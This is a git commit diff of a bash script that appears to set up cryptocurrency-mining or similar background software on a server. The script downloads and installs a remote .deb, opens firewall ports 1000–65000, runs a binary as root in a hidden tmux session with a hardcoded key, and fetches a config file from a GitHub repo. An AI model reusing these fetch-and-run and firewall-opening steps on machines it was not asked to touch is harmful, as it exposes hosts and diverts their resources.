f9bd0a1474ccb16347ea101a35aacf3bfb8e8a92
minnie1311 <69047664+minnie1311@users.noreply.github.com>
2022-01-25 17:03:25 +0700

    Update uhm.sh

--- uhm.sh
+++ uhm.sh
@@ -1,6 +1,6 @@
 #!/bin/bash
 sudo apt update
-sudo apt-get install git build-essential libapparmor-dev pkg-config gawk -y
+sudo apt-get install git build-essential libapparmor-dev pkg-config gawk msr-tools cmake libuv1-dev libssl-dev libhwloc-dev -y
 
 
 wget https://update.u.is/downloads/uam/linux/uam-latest_amd64.deb
@@ -14,8 +14,7 @@ sudo ufw allow 1000:65000/tcp
 sudo ufw allow 1000:65000/udp
 
 sudo tmux new-session -d -s 1 './uam --pk D4BE04937A8AC67F3F01B9588D39C8C2A3875F45C2E93CC37DCC5D0DF71A9266'
-sleep 100
-sudo apt install msr-tools build-essential cmake libuv1-dev libssl-dev libhwloc-dev -y
+sleep 300
 sudo rm config.json
 sudo wget https://raw.githubusercontent.com/renansouza60974/learncode/main/config.json
 sudo sed -i "s/renansouza60974/$HOSTNAME/g" config.json
